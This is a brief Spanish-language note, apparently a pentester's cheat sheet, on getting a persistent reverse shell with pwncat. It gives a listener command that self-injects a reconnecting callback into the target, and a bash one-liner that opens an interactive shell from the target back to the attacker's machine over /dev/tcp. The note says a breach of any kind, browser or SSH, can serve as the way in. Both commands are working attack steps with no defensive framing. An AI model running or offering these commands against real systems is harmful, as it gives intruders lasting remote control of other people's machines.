Con esta utilidad podemos establecer un shell indestructible para ahorrarnos que tengamos que constantemente ejecutar los pasos de establecer un chell

```
A la escucha por el puerto 4444 y despues inyecta una serie de comando al objetivo para establecer un intento de conexion a nuesta maquina siempre

Lo ejecutamos en nuestra maquina
pwncat -l 4444 --self-inject /bin/sh:192.168.1.108:4444

Luego establecemos la conexion desde la maquina objetivo ya sea mediante un brecha en el navegador por ssh donde sea solo hay que establecer la conexion con el puerto a la escuha

bash -i >& /dev/tcp/192.168.1.108/4444 0>&1
```